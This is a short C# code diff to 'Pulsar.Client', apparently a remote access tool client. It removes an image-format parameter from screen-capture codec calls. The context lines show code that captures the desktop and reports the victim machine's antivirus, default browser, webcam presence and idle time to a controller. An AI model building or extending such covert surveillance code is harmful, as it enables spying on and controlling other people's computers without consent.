@@ -14,7 +14,6 @@ using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
 using System.Linq;
-using Pulsar.Client.Utilities;
 
 namespace Pulsar.Client.Messages
 {
@@ -51,12 +50,12 @@ namespace Pulsar.Client.Messages
             var resolution = new Resolution { Height = monitorBounds.Height, Width = monitorBounds.Width };
 
             if (_streamCodec == null)
-                _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution, RemoteCaptureEncoding.PreferredFormat);
+                _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
 
             if (_streamCodec.ImageQuality != message.Quality || _streamCodec.Monitor != message.DisplayIndex || _streamCodec.Resolution != resolution)
             {
                 _streamCodec?.Dispose();
-                _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution, RemoteCaptureEncoding.PreferredFormat);
+                _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
             }
 
             CaptureAndSendScreen();
@@ -103,11 +102,9 @@ namespace Pulsar.Client.Messages
                 {
                     if (_streamCodec == null) throw new Exception("StreamCodec can not be null.");
                     _streamCodec.CodeImage(_desktopData.Scan0,
-                        _desktopData.Stride,
                         new Rectangle(0, 0, processedBitmap.Width, processedBitmap.Height),
                         new Size(processedBitmap.Width, processedBitmap.Height),
-                        processedBitmap.PixelFormat,
-                        stream);
+                        processedBitmap.PixelFormat, stream);
                     _clientMain.Send(new GetPreviewResponse
                     {
                         Image = stream.ToArray(),
@@ -121,8 +118,7 @@ namespace Pulsar.Client.Messages
                         AV = SystemHelper.GetAntivirus(),
                         MainBrowser = SystemHelper.GetDefaultBrowser(),
                         HasWebcam = (WebcamHelper.GetWebcams()?.Length > 0),
-                        AFKTime = ActivityDetection.UserIdleTime().ToString(),
-                        ImageFormat = RemoteCaptureEncoding.PreferredFormat
+                        AFKTime = ActivityDetection.UserIdleTime().ToString()
                     });
                     
                     _streamCodec = null;
